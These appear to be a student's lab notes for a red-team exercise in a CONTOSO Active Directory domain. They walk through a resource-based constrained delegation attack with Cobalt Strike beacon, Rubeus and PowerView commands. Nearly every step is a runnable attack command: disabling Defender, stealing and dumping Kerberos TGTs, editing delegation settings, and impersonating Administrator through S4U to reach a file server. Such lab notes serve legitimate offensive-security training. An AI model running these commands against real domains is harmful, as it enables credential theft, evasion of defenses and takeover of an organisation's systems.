issue socks command to conduct attack via SOCKS proxy
    beacon> socks 1080 socks5

launch proxifier and set up!
    follow steps in socks lab

disable defender
    PS C:\WINDOWS\system32> Set-MpPreference -DisableRealtimeMonitoring $true

extract the TGT of pchilds in our medium integrity beacon
    beacon> krb_tgtdeleg

now on attacker desktop, run a netonly process
    PS C:\Users\Attacker> runas /netonly /user:CONTOSO\pchilds powershell

request an LDAP service ticket using the TGT we dumped
    C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt

now lets import powerview  
    PS C:\WINDOWS\system32> ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1

find principals with write privs on the msDS-AllowedToActOnBehalfOfOtherIdentity attribute
    PS C:\WINDOWS\system32> Get-DomainComputer -Server 'lon-dc-1' | Get-DomainObjectAcl -Server 'lon-dc-1' | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier

we see that an SID ending in 1107 has this privilege over 5 principals
let's query ldap to discover what the SID is
    PS C:\WINDOWS\system32> Get-DomainObject -LDAPFilter '(objectSid=S-1-5-21-3926355307-1661546229-813047887-1107)' -Server 'lon-dc-1'

it shows as the server admins group, which rsteel is part of!
lets go back to the beacon and grab the ticket for rsteel
    beacon> krb_triage
    beacon> krb_dump /user:rsteel /service:krbtgt

in the netonly process, purge the ldap ticket w pchilds and request new ticket for rsteel
    PS C:\WINDOWS\system32> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe purge
    PS C:\WINDOWS\system32> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt

now lets check for existing RBCD configs
    Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount

we see an existing config between lon-fs-1 and lon-ws-1, we do not want to remove this!
let's just add wkstn since we have SYSTEM on it
    PS C:\WINDOWS\system32> $ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 'lon-dc-1'
    PS C:\WINDOWS\system32> $wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 'lon-dc-1'
    PS C:\WINDOWS\system32> Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 'lon-dc-1'

verify it was added
    PS C:\WINDOWS\system32> Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount

now go back to cobalt and dump the TGT for lon-wkstn-1
    beacon> krb_dump /user:lon-wkstn-1$ /service:krbtgt

request a usable service ticket for cifs/lon-fs-1 impersonating Administrator
    PS C:\WINDOWS\system32>  C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /dc:lon-dc-1 /outfile:C:\Users\Attacker\Desktop\

now use the service ticket to interact with lon-fs-1
    beacon> make_token CONTOSO\Administrator FakePass
    beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\cifs.kirbi

restore the RBCD config to how it was
    PS C:\WINDOWS\system32> Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 'lon-dc-1'
    PS C:\WINDOWS\system32> Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount